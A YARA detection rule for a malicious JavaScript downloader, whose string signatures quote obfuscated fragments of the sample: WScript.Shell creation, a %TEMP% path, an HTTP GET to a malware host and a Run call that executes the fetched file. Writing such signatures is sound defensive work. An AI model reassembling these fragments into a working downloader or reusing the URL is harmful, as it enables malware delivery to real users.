rule sig_20160427_750b08ccee01a1ac5dc1ba3d5c9825b6 {
  meta:
    description = "datamaliciousorder - file 20160427_750b08ccee01a1ac5dc1ba3d5c9825b6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "83427674a03259a49c1fcd5b7ed16ec1461efc635e58b8bf99c0350ee26da4b6"

  strings:
    $s1  = "function DjbgqIlito() {return PrjluPynig[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"IPemKWn" ascii
    $s2  = "function DjbgqIlito() {return PrjluPynig[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"IPemKWn" ascii
    $s3  = "function XjynqNkona(MjnsjXhksa, PixtjPdsks){EkopiUkprd = EkopiUkprd * 1; return MjnsjXhksa - PixtjPdsks;};" fullword ascii
    $s4  = "var PrjluPynig = function WhcssZjwia() {return PplyzPxrsq[WkykiIvbao](\"WScript\"+\".Shell\");}(), AyztwTjfzy = 11;" fullword ascii
    $s5  = "OloddQbhju[KoddvWykjm](\"G\" + \"ET\", \"http://games-k.ru/n8eis\", false);" fullword ascii
    $s6  = "var PplyzPxrsq = this[\"WScript\"];" fullword ascii
    $s7  = "if (OloddQbhju[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function FqmqeIfcut(){return SvsvnLmqen + \"\";};" fullword ascii
    $s9  = "function HvptpUihhd() {return ((WuxqeYjqit == true) && (WuxqeYjqit == XmzduXypzm)) ? 1 : EkopiUkprd;};" fullword ascii
    $s10 = "WuxqeYjqit = true; " fullword ascii
    $s11 = "function GfrpmPwuht(){return WkykiIvbao;};" fullword ascii
    $s12 = "SntrzGvtms = true;" fullword ascii
    $s13 = "var XmzduXypzm = false;" fullword ascii
    $s14 = "var SntrzGvtms = false;" fullword ascii
    $s15 = "function KxnsyWeina(IacxjZniul){PrjluPynig[\"R\"+\"un\"](IacxjZniul, EkopiUkprd, EkopiUkprd);};" fullword ascii
    $s16 = "var WuxqeYjqit = false;" fullword ascii
    $s17 = "}while (CyzidQbcdf);" fullword ascii
    $s18 = "function ZflhoGinmj(PzkmuKsjyn) {var AuevwDmpbg = (1, 2, 3, 4, 5, PzkmuKsjyn); return AuevwDmpbg;};" fullword ascii
    $s19 = "return XjynqNkona(FelmjZgzav, GytswZqkvg);" fullword ascii
    $s20 = "var PkvyuRyjes = new this[\"D\"+\"ate\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}